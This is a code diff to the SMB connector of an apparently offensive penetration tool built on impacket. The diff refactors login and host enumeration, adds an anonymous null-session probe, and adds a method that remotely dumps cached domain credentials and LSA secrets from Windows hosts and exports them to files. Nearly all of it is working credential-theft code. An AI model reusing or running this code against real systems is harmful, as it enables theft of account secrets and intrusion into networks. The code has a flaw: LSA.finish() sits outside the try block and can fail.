@@ -3,12 +3,12 @@ from random import choice
 from impacket.dcerpc.v5 import scmr
 from impacket.smb import SMB_DIALECT
 from string import ascii_letters, digits
-from impacket.smbconnection import SMBConnection
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5.transport import SMBTransport
 from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
+from impacket.smbconnection import SMBConnection, SessionError
 from impacket.dcerpc.v5.transport import DCERPCTransportFactory
-from impacket.examples.secretsdump import RemoteOperations, SAMHashes, NTDSHashes
+from impacket.examples.secretsdump import RemoteOperations, SAMHashes, NTDSHashes, LSASecrets
 
 from ar3.helpers import remotefile
 from ar3.core.connector import Connector
@@ -25,7 +25,7 @@ class SmbCon(Connector):
         self.os         = ''
         self.admin      = False
         self.signing    = False
-        self.os_arch    = '0'
+        self.os_arch    = ''
         self.remote_ops = None
         self.bootkey    = None
         self.db         = db
@@ -35,23 +35,23 @@ class SmbCon(Connector):
     # Session Management
     #########################
     def create_smb_con(self):
-        # Create SMB Con
+        # @TODO refactor
         if self.smb_connection():
             self.host_info()
             try:
-                # SMB Auth
-                self.con.login(self.username, self.password, self.domain, lmhash=self.lmhash, nthash=self.nthash)
-                self.auth = True
-                self.host_info()
-                self.isAdmin()
-                self.update_db()
+                self.login()
             except Exception as e:
                 raise Exception(str(e))
         else:
             raise Exception('Connection to Server Failed')
 
-    def update_db(self):
-        self.db.update_host(self.host, self.ip, self.domain, self.os, self.signing)
+    def login(self):
+        self.con.login(self.username, self.password, self.domain, lmhash=self.lmhash, nthash=self.nthash)
+        self.auth = True
+        self.isAdmin()
+        self.updatedb_user()
+
+    def updatedb_user(self):
         if self.username and self.password or self.username and self.hash:
             self.db.update_user(self.username, self.password, self.domain, self.hash)
             if self.admin:
@@ -87,7 +87,7 @@ class SmbCon(Connector):
             self.smbv1=True
             self.con.setTimeout(self.timeout)
             return True
-        except Exception as e:
+        except:
             return False
 
     def smbv3_con(self):
@@ -95,7 +95,7 @@ class SmbCon(Connector):
             self.con = SMBConnection(self.client, self.host, sess_port=self.port, timeout=int(self.timeout))
             self.con.setTimeout(self.timeout)
             return True
-        except Exception as e:
+        except:
             return False
 
     #########################
@@ -116,18 +116,21 @@ class SmbCon(Connector):
     ################################
     def host_info(self):
         try:
-            self.srvdomain  = self.get_domain()
-            self.host       = self.get_hostname()
-            self.os         = self.con.getServerOS()
-            self.signing    = self.con.isSigningRequired()
+            self.con.login('', '')
+        except SessionError as e:
+            if "STATUS_ACCESS_DENIED" in e.getErrorString():
+                pass
 
-            arch = self.get_os_arch()
-            if arch == 32 or arch == 64:
-                self.os_arch = " x{}".format(str(arch))
-            else:
-                self.os_arch = ''
-        except Exception as e:
-            self.logger.debug("SMB Host Info: {}".format(str(e)))
+        self.srvdomain  = self.get_domain()
+        self.host       = self.get_hostname()
+        self.os         = self.con.getServerOS()
+        self.signing    = self.con.isSigningRequired()
+
+        arch = self.get_os_arch()
+        if arch != 0:
+            self.os_arch = " x{}".format(str(arch))
+
+        self.db.update_host(self.host, self.ip, self.domain, self.os, self.signing)
 
     def get_os_arch(self):
         # Credit: https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb.py
@@ -230,8 +233,6 @@ class SmbCon(Connector):
     #     https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
     ################################
     def enable_remoteops(self):
-        if self.remote_ops is not None and self.bootkey is not None:
-            return
         try:
             self.remote_ops = RemoteOperations(self.con, False, None)
             self.remote_ops.enableRegistry()
@@ -261,9 +262,35 @@ class SmbCon(Connector):
 
         try:
             self.remote_ops.finish()
-            SAM.finish()
         except Exception as e:
             self.logger.debug(["SAM", "Error calling remote_ops.finish(): {}".format(e)])
+        SAM.finish()
+
+    def lsa(self):
+        def add_lsa_secret(secret):
+            for x in secret.splitlines():
+                self.logger.success([self.host, self.ip, "LSA SECRET", x])
+                add_lsa_secret.secrets += 1
+
+        try:
+            outfile = os.path.join(os.path.expanduser('~'), '.ar3', 'workspaces', self.args.workspace, self.domain)
+            add_lsa_secret.secrets = 0
+            self.enable_remoteops()
+            if self.remote_ops and self.bootkey:
+                SECURITYFileName = self.remote_ops.saveSECURITY()
+                LSA = LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True, perSecretCallback=lambda secretType, secret: add_lsa_secret(secret))
+                LSA.dumpCachedHashes()
+                LSA.exportCached(outfile)
+                LSA.dumpSecrets()
+                LSA.exportSecrets(outfile)
+        except Exception as e:
+            self.logger.debug('LSA Extraction Failed for {}: {}'.format(self.host, str(e)))
+
+        try:
+            self.remote_ops.finish()
+        except Exception as e:
+            self.logger.debug(["LSA", "Error calling remote_ops.finish(): {}".format(e)])
+        LSA.finish()
 
     def ntds(self):
         def add_ntds_hash(ntds_hash):
